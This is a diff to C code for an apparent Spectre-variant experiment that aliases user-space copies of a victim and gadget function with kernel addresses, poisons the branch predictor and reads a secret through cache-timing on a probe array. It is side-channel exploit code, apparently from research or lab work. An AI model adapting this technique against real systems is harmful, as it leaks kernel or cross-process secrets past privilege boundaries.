@@ -19,10 +19,6 @@
 #define CACHE_HIT_THRESHOLD 80
 #define GAP 1024
 
-u8 *channel;
-u64 *target;
-char *secretPhrase = "The Magic Words are Squeamish Ossifrage.";
-
 // mimic the safe target
 __attribute__((noinline))
 int
@@ -43,13 +39,17 @@ dummy_victim(u8 *channel, u64 dest, int input)
     junk += input & i;
   }
 
-  // use 10 nops to get the offsets between user and kernel to match
+  // use nops to get the offsets between user and kernel to match
   int result;
-  __asm volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
+  __asm volatile("nop\nnop\nnop\nnop\nnop\n"
+                 "nop\nnop\nnop\nnop\nnop\n"
                  "callq *%1\n"
                  "mov %%eax, %0\n"
                  : "=r" (result)
-                 : "r" (dest));
+                 : "r" (dest)
+                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
+  result &= (u64)channel;
+  result &= ((u64)(channel) >> 32);
   return result & junk & ((u64)channel);
 }
 
@@ -79,9 +79,9 @@ main(int argc, char *argv[])
   for (uvoffset = 0; *(code + uvoffset) != 0xff; uvoffset++);
   printf("uvoffset: %d\n", uvoffset);
 
-  if (false && kvoffset != uvoffset) {
+  if (kvoffset != uvoffset) {
     printf("kernel and user offsets don't match\n");
-    return 1;
+    //return 1;
   }
 
   u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
@@ -100,24 +100,30 @@ main(int argc, char *argv[])
     return 1;
   }
 
-  // 64 just has to be larger than function
-  memcpy((void*) uva, (void*) &dummy_victim, 64);
+  // size should be larger than function
+  void* dest = memcpy((void*) uva, (void*) &dummy_victim, 160);
+  if ((u64)dest != uva) {
+    printf("memcpy uva failed\n");
+    return 1;
+  }
 
-  // 8 so that we don't overwrite uva
-  memcpy((void*) uga, (void*) &dummy_gadget, 8);
+  // don't copy too much or else it will overwrite uva
+  dest = memcpy((void*) uga, (void*) &dummy_gadget, 20);
+  if ((u64)dest != uga) {
+    printf("memcpy uga failed\n");
+    return 1;
+  }
 
   auto uv = ((int (*)(u8*, u64, int)) uva);
 
-  target = (u64*)malloc(sizeof(u64));
-  printf("target addr: 0x%lx\n", (u64)target);
+  //set_safe_addr(ksa);
 
   // see appendix C of https://spectreattack.com/spectre.pdf
-  channel = (u8*) malloc(256 * GAP * sizeof(u8));
+  u8 *channel = (u8*) malloc(256 * GAP * sizeof(u8));
   int hits[256]; // record cache hits
   int tries, i, j, k, mix_i, junk = 0;
   u64 start, elapsed;
   volatile u8 *addr;
-  volatile int secret;
 
   for (i = 0; i < 256; i++) {
     hits[i] = 0;
@@ -126,13 +132,13 @@ main(int argc, char *argv[])
 
   for (tries = 999; tries > 0; tries--) {
     // poison branch predictor
-    set_safe_addr(kga);
-    mfence();
+    //set_safe_addr(kga);
+    //mfence();
 
-    secret = 84;
     for (j = 50; j > 0; j--) {
-      // junk ^= uv(channel, (u64) &dummy_gadget, 0);
-      junk ^= victim(channel, 84, 0);
+      //junk ^= victim(channel, 84, 0);
+      //junk ^= uv(channel, (u64) &dummy_gadget, 0);
+      junk ^= uv(channel, uga, 0);
     }
 
     mfence();
@@ -143,13 +149,11 @@ main(int argc, char *argv[])
 
     mfence();
 
-    set_safe_addr(ksa);
-
+    //set_safe_addr(ksa);
     mfence();
 
     // flush actual target
     flush_target();
-    secret = 42;
 
     mfence();
 
@@ -168,7 +172,6 @@ main(int argc, char *argv[])
     //printf("incorrect elapsed: %lu\n", elapsed);
 
     //junk ^= channel[250 * GAP];
-    //gadget(channel, &secret);
 
     mfence();
 
